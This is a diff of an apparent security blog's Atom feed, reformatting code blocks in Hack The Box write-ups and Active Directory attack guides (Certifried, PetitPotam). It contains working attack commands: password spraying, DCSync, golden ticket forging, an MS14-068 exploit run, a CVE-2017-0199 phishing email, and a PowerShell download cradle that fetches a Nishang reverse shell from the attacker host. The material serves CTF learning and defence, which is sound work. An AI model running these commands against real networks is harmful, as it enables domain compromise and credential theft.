@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-07-03T00:19:18+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">OmniSl4sh’s Blog</title><entry><title type="html">HTB Writeup [Windows - Medium] - Intelligence</title><link href="http://localhost:4000/2022/07/01/Intelligence.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Medium] - Intelligence" /><published>2022-07-01T00:00:00+02:00</published><updated>2022-07-01T00:00:00+02:00</updated><id>http://localhost:4000/2022/07/01/Intelligence</id><content type="html" xml:base="http://localhost:4000/2022/07/01/Intelligence.html"><![CDATA[<p><img src="/assets/Intelligence/Intelligence.png" alt="Search" /></p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-07-03T01:01:19+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">OmniSl4sh’s Blog</title><entry><title type="html">HTB Writeup [Windows - Medium] - Intelligence</title><link href="http://localhost:4000/2022/07/01/Intelligence.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Medium] - Intelligence" /><published>2022-07-01T00:00:00+02:00</published><updated>2022-07-01T00:00:00+02:00</updated><id>http://localhost:4000/2022/07/01/Intelligence</id><content type="html" xml:base="http://localhost:4000/2022/07/01/Intelligence.html"><![CDATA[<p><img src="/assets/Intelligence/Intelligence.png" alt="Search" /></p>
 
 <h3 id="summary">Summary</h3>
 <ul>
@@ -1000,7 +1000,9 @@ Host script results:
 
 <h1 id="attack-demonstration">Attack Demonstration</h1>
 <h2 id="1-joining-a-machine-account-to-the-domain-with-a-spoofed-dnshostname">1. Joining A Machine Account to The Domain with A Spoofed DNSHostname</h2>
-<p><strong>Command:</strong> <code class="language-plaintext highlighter-rouge">certipy account create &lt;DOMAIN_FQDN&gt;/&lt;AD_USER&gt;@&lt;DC_IP&gt; -user '&lt;NEW_COMPUTER_NAME&gt;' -dns &lt;DC_FQDN&gt;</code></p>
+<p><strong>Command:</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy account create &lt;DOMAIN_FQDN&gt;/&lt;AD_USER&gt;@&lt;DC_IP&gt; <span class="nt">-user</span> <span class="s1">'&lt;NEW_COMPUTER_NAME&gt;'</span> <span class="nt">-dns</span> &lt;DC_FQDN&gt;
+</code></pre></div></div>
 
 <p><img src="/assets/Certifried/creating-computer-with-spoofed-dns-hostname.jpg" alt="creating-computer-with-spoofed-dns-hostname" /></p>
 
@@ -1013,19 +1015,25 @@ Host script results:
 
 <p><img src="/assets/Certifried/finding-out-the-ca-name.jpg" alt="finding-out-the-ca-name" /></p>
 
-<p><strong>Command:</strong> <code class="language-plaintext highlighter-rouge">certipy req -dc-ip &lt;DC_IP&gt; &lt;DOMAIN_FQDN&gt;/'&lt;ADDED_COMPUTER_NAME_ENDING_WITH_DOLLAR_SIGN&gt;'@&lt;DC_IP&gt; -ca &lt;CA_NAME&gt; -template Machine</code></p>
+<p><strong>Command:</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy req <span class="nt">-dc-ip</span> &lt;DC_IP&gt; &lt;DOMAIN_FQDN&gt;/<span class="s1">'&lt;ADDED_COMPUTER_NAME_ENDING_WITH_DOLLAR_SIGN&gt;'</span>@&lt;DC_IP&gt; <span class="nt">-ca</span> &lt;CA_NAME&gt; <span class="nt">-template</span> Machine
+</code></pre></div></div>
 
 <p>Password = the same password generated from the computer creation in the previous step</p>
 
 <p><img src="/assets/Certifried/requesting-dc-cert.jpg" alt="requesting-dc-cert" /></p>
 
 <h2 id="3-using-the-domain-controllers-certificate-to-get-its-ntlm-hash">3. Using the Domain Controller’s Certificate To Get its NTLM Hash</h2>
-<p><strong>Command:</strong> <code class="language-plaintext highlighter-rouge">certipy auth -pfx &lt;GENERATED_PFX_CERTIFICATE&gt;</code></p>
+<p><strong>Command:</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy auth <span class="nt">-pfx</span> &lt;GENERATED_PFX_CERTIFICATE&gt;
+</code></pre></div></div>
 
 <p><img src="/assets/Certifried/got-nt-hash-for-dc.jpg" alt="got-nt-hash-for-dc" /></p>
 
 <h2 id="4-performing-dcsync-as-the-impersonated-domain-controller">4. Performing DCSync As The Impersonated Domain Controller</h2>
-<p><strong>Command:</strong> <code class="language-plaintext highlighter-rouge">secretsdump.py -just-dc &lt;DOMAIN_FQDN&gt;/'&lt;DC_NAME_ENDING_WITH_DOLLAR_SIGN&gt;'@&lt;DC_IP&gt; -hashes :&lt;RETRIEVED_HASH&gt;</code></p>
+<p><strong>Command:</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>secretsdump.py <span class="nt">-just-dc</span> &lt;DOMAIN_FQDN&gt;/<span class="s1">'&lt;DC_NAME_ENDING_WITH_DOLLAR_SIGN&gt;'</span>@&lt;DC_IP&gt; <span class="nt">-hashes</span> :&lt;RETRIEVED_HASH&gt;
+</code></pre></div></div>
 
 <p><img src="/assets/Certifried/dc-sync-with-dc-ntlm-hash.jpg" alt="dc-sync-with-dc-ntlm-hash" /></p>
 
@@ -1117,25 +1125,27 @@ Host script results:
 
 <p>we run it using the <code class="language-plaintext highlighter-rouge">-A</code> switch as well as <code class="language-plaintext highlighter-rouge">-oY</code> to output into <strong>YAML format</strong>.</p>
 
-<p>Command: <code class="language-plaintext highlighter-rouge">enum4linux-ng -A 10.10.10.182 -oY e4lng-output</code></p>
+<p><strong>Command:</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>enum4linux-ng <span class="nt">-A</span> 10.10.10.182 <span class="nt">-oY</span> e4lng-output
+</code></pre></div></div>
 
 <p>we get a bunch of cool stuff:</p>
 
-<ol>
-  <li>usernames</li>
-</ol>
+<ul>
+  <li><strong>Usernames</strong></li>
+</ul>
 
 <p><img src="/assets/Cascade/e4lng-output-users.jpg" alt="e4lng-output-users" /></p>
 
-<ol>
-  <li>groups</li>
-</ol>
+<ul>
+  <li><strong>Groups</strong></li>
+</ul>
 
 <p><img src="/assets/Cascade/e4lng-output-groups.jpg" alt="e4lng-output-groups" /></p>
 
-<ol>
-  <li>password policy</li>
-</ol>
+<ul>
+  <li><strong>Password Policy</strong></li>
+</ul>
 
 <p><img src="/assets/Cascade/e4lng-output-pass-pol.jpg" alt="e4lng-output-pass-pol" /></p>
 
@@ -1144,7 +1154,9 @@ Host script results:
 <h3 id="time-saving-1-asreproasting">Time Saving #1: ASREPRoasting</h3>
 <p><em>To save time,</em> we’re going to do the <strong>ASREPRoast</strong> first because it’s a quick check and has a high chance of giving us creds (<em>if we crack the hash</em>).</p>
 
-<p>Command: <code class="language-plaintext highlighter-rouge">GetNPUsers.py -dc-ip 10.10.10.182 -request -debug -usersfile users.txt cascade.local/</code></p>
+<p><strong>Command:</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GetNPUsers.py <span class="nt">-dc-ip</span> 10.10.10.182 <span class="nt">-request</span> <span class="nt">-debug</span> <span class="nt">-usersfile</span> users.txt cascade.local/
+</code></pre></div></div>
 
 <p><strong>Note:</strong> <em>I generally prefer to use the</em> <code class="language-plaintext highlighter-rouge">-debug</code> <em>flag with everything. It can save me a lot of time in troubleshooting.</em></p>
 
@@ -1157,7 +1169,9 @@ Host script results:
 <h3 id="time-saving-2-password-spraying-in-the-background">Time Saving #2: Password Spraying in the background</h3>
 <p><em>Since the password policy contained no user lockout,</em> we’re good to go spraying :D</p>
 
-<p>Command: <code class="language-plaintext highlighter-rouge">for i in $(cat /opt/Seclists/Passwords/Common-Credentials/500-worst-passwords.txt); do kerbrute passwordspray --dc 10.10.10.182 -d cascade.local users.txt $i | grep -oP '\[\+\].*'; done</code></p>
+<p><strong>Command:</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for </span>i <span class="k">in</span> <span class="si">$(</span><span class="nb">cat</span> /opt/Seclists/Passwords/Common-Credentials/500-worst-passwords.txt<span class="si">)</span><span class="p">;</span> <span class="k">do </span>kerbrute passwordspray <span class="nt">--dc</span> 10.10.10.182 <span class="nt">-d</span> cascade.local users.txt <span class="nv">$i</span> | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'\[\+\].*'</span><span class="p">;</span> <span class="k">done</span>
+</code></pre></div></div>
 
 <p>what this does:</p>
 
@@ -1187,7 +1201,9 @@ Host script results:
 <h3 id="ldap">LDAP</h3>
 <p>We’re going to enumerate <strong>LDAP</strong> and see if we can find something there.</p>
 
-<p>Command: <code class="language-plaintext highlighter-rouge">ldapsearch -x -H ldap://10.10.10.182 -b 'dc=cascade,dc=local'</code></p>
+<p><strong>Command:</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ldapsearch <span class="nt">-x</span> <span class="nt">-H</span> ldap://10.10.10.182 <span class="nt">-b</span> <span class="s1">'dc=cascade,dc=local'</span>
+</code></pre></div></div>
 
 <p>The output was huge (6k+ lines). So we saved it to <code class="language-plaintext highlighter-rouge">ldap-output</code></p>
 
@@ -1286,9 +1302,13 @@ Host script results:
 
 <p><img src="/assets/Cascade/steve-smb-access.jpg" alt="steve-smb-access" /></p>
 
-<p>we mount the share with: <code class="language-plaintext highlighter-rouge">mount -t cifs -o 'username=s.smith,password=sT333ve2' //10.10.10.182/Audit$ /mnt</code></p>
+<p>we mount the share with:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mount <span class="nt">-t</span> cifs <span class="nt">-o</span> <span class="s1">'username=s.smith,password=sT333ve2'</span> //10.10.10.182/Audit<span class="nv">$ </span>/mnt
+</code></pre></div></div>
 
-<p>and list the files with: <code class="language-plaintext highlighter-rouge">find /mnt -type f 2&gt;/dev/null</code></p>
+<p>and list the files with:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find /mnt <span class="nt">-type</span> f 2&gt;/dev/null
+</code></pre></div></div>
 
 <p><img src="/assets/Cascade/mount-and-find.jpg" alt="mount-and-find" /></p>
 
@@ -1351,7 +1371,7 @@ Host script results:
 
 <p><img src="/assets/Cascade/dnspy-casc-exe.jpg" alt="dnspy-casc-exe" /></p>
 
-<p>it’s <code class="language-plaintext highlighter-rouge">c4scadek3y654321</code></p>
+<p>it’s <strong>“c4scadek3y654321”</strong></p>
 
 <p><em>Looking at the code,</em> it seems that the <code class="language-plaintext highlighter-rouge">.exe</code> reads the encrypted password from the database and decrypts it using the <code class="language-plaintext highlighter-rouge">DecryptString</code> function before moving on to carry out its tasks.</p>
 
@@ -1396,7 +1416,9 @@ Host script results:
 
 <p>Just in case his password was in one of them. Just like the <code class="language-plaintext highlighter-rouge">r.thompson</code> user or something.</p>
 
-<p>Command: <code class="language-plaintext highlighter-rouge">Get-ADObject -ldapFilter:"(msDS-LastKnownRDN=*)" -IncludeDeletedObjects -Properties * | Select -Last 1</code></p>
+<p><strong>Command:</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-ADObject</span><span class="w"> </span><span class="nt">-ldapFilter</span><span class="p">:</span><span class="s2">"(msDS-LastKnownRDN=*)"</span><span class="w"> </span><span class="nt">-IncludeDeletedObjects</span><span class="w"> </span><span class="nt">-Properties</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select</span><span class="w"> </span><span class="nt">-Last</span><span class="w"> </span><span class="nx">1</span><span class="w">
+</span></code></pre></div></div>
 
 <p><img src="/assets/Cascade/temp-admin-password.jpg" alt="temp-admin-password" /></p>
 
@@ -1748,7 +1770,8 @@ Host script results:
 
 <p>We’re going to run the exploit with the needed parameters.</p>
 
-<p><code class="language-plaintext highlighter-rouge">python2.7 ./ms14-068.py -u james@htb.local -s S-1-5-21-4220043660-4019079961-2895681657-1103 -d mantis.htb.local -p 'J@m3s_P@ssW0rd!'</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python2.7 ./ms14-068.py <span class="nt">-u</span> james@htb.local <span class="nt">-s</span> S-1-5-21-4220043660-4019079961-2895681657-1103 <span class="nt">-d</span> mantis.htb.local <span class="nt">-p</span> <span class="s1">'J@m3s_P@ssW0rd!'</span>
+</code></pre></div></div>
 
 <p><img src="/assets/Mantis/got-forged-ticket.jpg" alt="got-forged-ticket" /></p>
 
@@ -1926,19 +1949,19 @@ Host script results:
 
 <p><em>Since we were nearing a dead end with our enumeration,</em> we’re going to use a simple <code class="language-plaintext highlighter-rouge">bash</code> script to check for <code class="language-plaintext highlighter-rouge">write</code> access in the SMB share.</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#!/bin/bash
-list=$(find /mnt -type d)
-for d in $list
-do
-        touch $d/just-a-test-dir 2&gt;/dev/null
-        if [ $? -eq 0 ]
-        then
-                echo -e "\e[32m[+] $d is writable\e[0m"
-                rm $d/just-a-test-dir
-        else
-                echo -e "\e[31m[-] $d is not writable\e[0m"
-        fi
-done
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+<span class="nv">list</span><span class="o">=</span><span class="si">$(</span>find /mnt <span class="nt">-type</span> d<span class="si">)</span>
+<span class="k">for </span>d <span class="k">in</span> <span class="nv">$list</span>
+<span class="k">do
+        </span><span class="nb">touch</span> <span class="nv">$d</span>/just-a-test-dir 2&gt;/dev/null
+        <span class="k">if</span> <span class="o">[</span> <span class="nv">$?</span> <span class="nt">-eq</span> 0 <span class="o">]</span>
+        <span class="k">then
+                </span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\e</span><span class="s2">[32m[+] </span><span class="nv">$d</span><span class="s2"> is writable</span><span class="se">\e</span><span class="s2">[0m"</span>
+                <span class="nb">rm</span> <span class="nv">$d</span>/just-a-test-dir
+        <span class="k">else
+                </span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\e</span><span class="s2">[31m[-] </span><span class="nv">$d</span><span class="s2"> is not writable</span><span class="se">\e</span><span class="s2">[0m"</span>
+        <span class="k">fi
+done</span>
 </code></pre></div></div>
 
 <ol>
@@ -2009,7 +2032,8 @@ Command=ToggleDesktop
 
 <p>The command should be as below:</p>
 
-<p><code class="language-plaintext highlighter-rouge">openssl req -newkey rsa:2048 -keyout amanda.key -out amanda.csr</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl req <span class="nt">-newkey</span> rsa:2048 <span class="nt">-keyout</span> amanda.key <span class="nt">-out</span> amanda.csr
+</code></pre></div></div>
 
 <p><img src="/assets/Sizzle/gen-key-gen-csr.jpg" alt="gen-key-gen-csr" /></p>
 
@@ -2239,7 +2263,8 @@ new format / converted documents will be saved here.
 
 <p>the command is:</p>
 
-<p><code class="language-plaintext highlighter-rouge">smtp-user-enum -M VRFY -U users.txt -t 10.10.10.77</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smtp-user-enum <span class="nt">-M</span> VRFY <span class="nt">-U</span> users.txt <span class="nt">-t</span> 10.10.10.77
+</code></pre></div></div>
 
 <p>That takes a while to run. And it comes up short. <em>So we move on…</em></p>
 
@@ -2305,13 +2330,13 @@ new format / converted documents will be saved here.
 </ul>
 
 <p>Our command is:</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sendEmail \
--t nico@megabank.com \
--f review@megabank.com \
--s 10.10.10.77 \
--u 'Document for Review' \
--a /opt/CVE-2017-0199/review.rtf \
--m 'Kindly review the attached document. Just press OK if you get an error while opening it and it should be fine.'
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sendEmail <span class="se">\</span>
+<span class="nt">-t</span> nico@megabank.com <span class="se">\</span>
+<span class="nt">-f</span> review@megabank.com <span class="se">\</span>
+<span class="nt">-s</span> 10.10.10.77 <span class="se">\</span>
+<span class="nt">-u</span> <span class="s1">'Document for Review'</span> <span class="se">\</span>
+<span class="nt">-a</span> /opt/CVE-2017-0199/review.rtf <span class="se">\</span>
+<span class="nt">-m</span> <span class="s1">'Kindly review the attached document. Just press OK if you get an error while opening it and it should be fine.'</span>
 </code></pre></div></div>
 
 <p>We try to look non-suspicous as possible. And use a subtle message in the body to have the user click ‘OK’ if he gets an error message (<em>which does happen with this exploit</em>).</p>
@@ -2349,7 +2374,8 @@ new format / converted documents will be saved here.
 
 <p>Switching to <strong>PowerShell</strong> from <strong>CMD</strong> can be done with the below command using the famous <strong>Nishang shell</strong> (https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) adding the <code class="language-plaintext highlighter-rouge">Invoke-PowerShellTcp</code> call at the bottom of the <code class="language-plaintext highlighter-rouge">.ps1</code></p>
 
-<p><code class="language-plaintext highlighter-rouge">powershell "IEX(New-Object Net.webClient).downloadString('http://10.10.16.7:8000/nishang.ps1')"</code></p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>powershell <span class="s2">"IEX(New-Object Net.webClient).downloadString('http://10.10.16.7:8000/nishang.ps1')"</span>
+</code></pre></div></div>
 
 <p><em>To run the</em> <code class="language-plaintext highlighter-rouge">Invoke-BloodHound</code> <em>method</em>, We import the <code class="language-plaintext highlighter-rouge">SharpHound.ps1</code> script into memory using the same we ran <code class="language-plaintext highlighter-rouge">Nishang.ps1</code>:</p>
 
@@ -2381,9 +2407,13 @@ new format / converted documents will be saved here.
 
 <p><img src="/assets/Reel/set-dom-obj-owner.jpg" alt="set-dom-obj-owner" /></p>
 
-<p><strong>Command:</strong> <code class="language-plaintext highlighter-rouge">Set-DomainObjectOwner -Identity herman -OwnerIdentity nico</code></p>
+<p><strong>Command:</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Set-DomainObjectOwner</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="nx">herman</span><span class="w"> </span><span class="nt">-OwnerIdentity</span><span class="w"> </span><span class="nx">nico</span><span class="w">
+</span></code></pre></div></div>
 
-<p>We will need to follow up with <code class="language-plaintext highlighter-rouge">Add-DomainObjectAcl -TargetIdentity herman -PrincipalIdentity nico -Rights ResetPassword</code></p>
+<p>We will need to follow up with:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Add-DomainObjectAcl</span><span class="w"> </span><span class="nt">-TargetIdentity</span><span class="w"> </span><span class="nx">herman</span><span class="w"> </span><span class="nt">-PrincipalIdentity</span><span class="w"> </span><span class="nx">nico</span><span class="w"> </span><span class="nt">-Rights</span><span class="w"> </span><span class="nx">ResetPassword</span><span class="w">
+</span></code></pre></div></div>
 
 <p><img src="/assets/Reel/add-dom-object-acl.jpg" alt="add-dom-object-acl" /></p>
 
@@ -2393,11 +2423,13 @@ new format / converted documents will be saved here.
 
 <p>We create a <code class="language-plaintext highlighter-rouge">secure string</code> object using:</p>
 
-<p><code class="language-plaintext highlighter-rouge">$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force</code></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$UserPassword</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="s1">'Password123!'</span><span class="w"> </span><span class="nt">-AsPlainText</span><span class="w"> </span><span class="nt">-Force</span><span class="w">
+</span></code></pre></div></div>
 
 <p>and set the password:</p>
 
-<p><code class="language-plaintext highlighter-rouge">Set-DomainUserPassword -Identity herman -AccountPassword $UserPassword</code></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Set-DomainUserPassword</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="nx">herman</span><span class="w"> </span><span class="nt">-AccountPassword</span><span class="w"> </span><span class="nv">$UserPassword</span><span class="w">
+</span></code></pre></div></div>
 
 <h3 id="logging-in-as-herman-and-joining-the-backup_admins-group">Logging in as herman and joining the <code class="language-plaintext highlighter-rouge">backup_admins</code> group</h3>
 
@@ -2413,10 +2445,10 @@ new format / converted documents will be saved here.
 
 <p>We first <em>relog</em> to <em>refresh our access</em> and check our newly-found acccess using <code class="language-plaintext highlighter-rouge">PowerShell</code>:</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ErrorActionPreference = 'silentlycontinue'
-ls -recurse -force | ? {$_.fullname -notmatch 'AppData|Application Data|Local Settings'} | ? {(get-acl $_.fullname ).accesstostring -like '*Backup_admins*'} | select -expand fullname
-$ErrorActionPreference = 'continue'
-</code></pre></div></div>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="bp">$Error</span><span class="n">ActionPreference</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'silentlycontinue'</span><span class="w">
+</span><span class="n">ls</span><span class="w"> </span><span class="nt">-recurse</span><span class="w"> </span><span class="nt">-force</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">?</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">fullname</span><span class="w"> </span><span class="o">-notmatch</span><span class="w"> </span><span class="s1">'AppData|Application Data|Local Settings'</span><span class="p">}</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">?</span><span class="w"> </span><span class="p">{(</span><span class="n">get-acl</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">fullname</span><span class="w"> </span><span class="p">)</span><span class="o">.</span><span class="nf">accesstostring</span><span class="w"> </span><span class="o">-like</span><span class="w"> </span><span class="s1">'*Backup_admins*'</span><span class="p">}</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nt">-expand</span><span class="w"> </span><span class="nx">fullname</span><span class="w">
+</span><span class="bp">$Error</span><span class="n">ActionPreference</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'continue'</span><span class="w">
+</span></code></pre></div></div>
 
 <p><img src="/assets/Reel/file-access-as-backup-admins.jpg" alt="file-access-as-backup-admins" /></p>
 
@@ -2563,12 +2595,14 @@ $ErrorActionPreference = 'continue'
 
 <h1 id="steps-to-create">Steps to Create</h1>
 <h2 id="1-set-up-ntlm-relay-on-our-attacker-host-to-forward-the-captured-authentication-to-adcs-web-ui">1. Set up NTLM Relay on our attacker host to forward the captured authentication to ADCS Web UI</h2>
-<p><code class="language-plaintext highlighter-rouge">ntlmrelayx.py -t http://&lt;CA_Server&gt;/certsrv/certfnsh.asp -smb2support --adcs --template DomainController</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ntlmrelayx.py <span class="nt">-t</span> http://&lt;CA_Server&gt;/certsrv/certfnsh.asp <span class="nt">-smb2support</span> <span class="nt">--adcs</span> <span class="nt">--template</span> DomainController
+</code></pre></div></div>
 
 <p><img src="/assets/petitpotam/ntlm-relay-start.jpg" alt="ntlm-relay-start" /></p>
 
 <h2 id="2-use-petitpotam-to-force-authentication-from-a-domain-controller-back-to-the-relaying-kali-machine">2. Use PetitPotam to force authentication from a domain controller back to the relaying kali machine</h2>
-<p><code class="language-plaintext highlighter-rouge">python3 PetitPotam.py -d &lt;DOMAIN_FQDN&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; &lt;KALI&gt; &lt;TARGET_DC&gt;</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 PetitPotam.py <span class="nt">-d</span> &lt;DOMAIN_FQDN&gt; <span class="nt">-u</span> &lt;USERNAME&gt; <span class="nt">-p</span> &lt;PASSWORD&gt; &lt;KALI&gt; &lt;TARGET_DC&gt;
+</code></pre></div></div>
 
 <p><img src="/assets/petitpotam/PetitPotam-Launched.jpg" alt="PetitPotam-Launched" /></p>
 
@@ -2578,14 +2612,16 @@ $ErrorActionPreference = 'continue'
 
 <h2 id="4-use-rubeus-on-the-windows-machine-to-request-a-tgt-for-that-account-using-the-certificate">4. Use Rubeus on the windows machine to request a TGT for that account using the certificate</h2>
 
-<p><code class="language-plaintext highlighter-rouge">.\Rubeus.exe asktgt /outfile:kirbi /dc:&lt;DOMAINCONTROLLER&gt; /domain:&lt;DOMAIN_FQDN&gt; /user:&lt;CAPTURED_DC_COMPUTER_ACCOUNT_NAME&gt; /ptt /certificate:&lt;CAPTURED_BASE64_CERTIFICATE&gt;</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Rubeus.exe asktgt /outfile:kirbi /dc:&lt;DOMAINCONTROLLER&gt; /domain:&lt;DOMAIN_FQDN&gt; /user:&lt;CAPTURED_DC_COMPUTER_ACCOUNT_NAME&gt; /ptt /certificate:&lt;CAPTURED_BASE64_CERTIFICATE&gt;
+</code></pre></div></div>
 
 <p><img src="/assets/petitpotam/rubeus-command.jpg" alt="rubeus-command" /></p>
 
 <p><img src="/assets/petitpotam/got-dc2-tgt.jpg" alt="got-dc2-tgt" /></p>
 
 <h2 id="5-having-the-tgt-in-memory-use-mimikatz-to-do-a-dcsync-attack">5. <em>Having the TGT in memory,</em> use Mimikatz to do a DCSync attack</h2>
-<p><code class="language-plaintext highlighter-rouge">lsadump::dcsync /domain:&lt;DOMAINFQDN&gt; /user:&lt;TARGET_USER&gt;</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lsadump::dcsync /domain:&lt;DOMAINFQDN&gt; /user:&lt;TARGET_USER&gt;
+</code></pre></div></div>
 
 <p><img src="/assets/petitpotam/dcsync-for-domain-admin-hash.jpg" alt="dcsync-for-domain-admin-hash" /></p>
 
@@ -2594,21 +2630,31 @@ $ErrorActionPreference = 'continue'
 <p><img src="/assets/petitpotam/code-execution-as-administrator.jpg" alt="code-execution-as-administrator" /></p>
 
 <h2 id="7-optional-create-a-golden-ticket-for-persistence">7. (Optional) Create a Golden Ticket for persistence</h2>
-<p>Domain SID Lookup: <code class="language-plaintext highlighter-rouge">lookupsid.py &lt;DOMAIN_FQDN&gt;/&lt;USERNAME&gt;@&lt;DC_IP&gt;</code></p>
+<p>Domain SID Lookup:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lookupsid.py &lt;DOMAIN_FQDN&gt;/&lt;USERNAME&gt;@&lt;DC_IP&gt;
+</code></pre></div></div>
 
 <p><img src="/assets/petitpotam/domain-sid-lookup.jpg" alt="domain-sid-lookup" /></p>
 
-<p>Obtaining the <code class="language-plaintext highlighter-rouge">krbtgt</code> account’s hash: <code class="language-plaintext highlighter-rouge">lsadump::dcsync /domain:&lt;DOMAIN_FQDN&gt; /user:krbtgt</code></p>
+<p>Obtaining the <code class="language-plaintext highlighter-rouge">krbtgt</code> account’s hash:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lsadump::dcsync /domain:&lt;DOMAIN_FQDN&gt; /user:krbtgt
+</code></pre></div></div>
 
 <p><img src="/assets/petitpotam/krbtgt-hash.jpg" alt="krbtgt-hash" /></p>
 
-<p>Golden ticket creation: <code class="language-plaintext highlighter-rouge">ticketer.py -nthash &lt;KRBTGT_HASH&gt; -domain-sid &lt;DOMAIN_SID&gt; -domain &lt;DOMAIN_FQDN&gt; &lt;CAN_BE_NON_EXISTING_USERNAME&gt;</code></p>
+<p>Golden ticket creation:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ticketer.py <span class="nt">-nthash</span> &lt;KRBTGT_HASH&gt; <span class="nt">-domain-sid</span> &lt;DOMAIN_SID&gt; <span class="nt">-domain</span> &lt;DOMAIN_FQDN&gt; &lt;CAN_BE_NON_EXISTING_USERNAME&gt;
+</code></pre></div></div>
 
 <p><img src="/assets/petitpotam/golden-ticket-created.jpg" alt="golden-ticket-created" /></p>
 
-<p>Exporting ticket to the environment: <code class="language-plaintext highlighter-rouge">export KRB5CCNAME=/&lt;CHOSEN_USERNAME&gt;.ccache</code></p>
+<p>Exporting ticket to the environment:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">export </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>/&lt;CHOSEN_USERNAME&gt;.ccache
+</code></pre></div></div>
 
-<p>Command execution using ticket: <code class="language-plaintext highlighter-rouge">psexec.py &lt;DOMAIN_FQDN&gt;/&lt;CHOSEN_USERNAME&gt;@&lt;DC_FQDN&gt; -k -no-pass</code></p>
+<p>Command execution using ticket:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>psexec.py &lt;DOMAIN_FQDN&gt;/&lt;CHOSEN_USERNAME&gt;@&lt;DC_FQDN&gt; <span class="nt">-k</span> <span class="nt">-no-pass</span>
+</code></pre></div></div>
 
 <p><img src="/assets/petitpotam/golden-ticket-used.jpg" alt="golden-ticket-used" /></p>
 
@@ -2635,7 +2681,9 @@ $ErrorActionPreference = 'continue'
 <p><img src="/assets/petitpotam/cert-srv-require-ssl.jpg" alt="cert-srv-require-ssl" /></p>
 
 <h2 id="4-restart-iis">4. Restart IIS</h2>
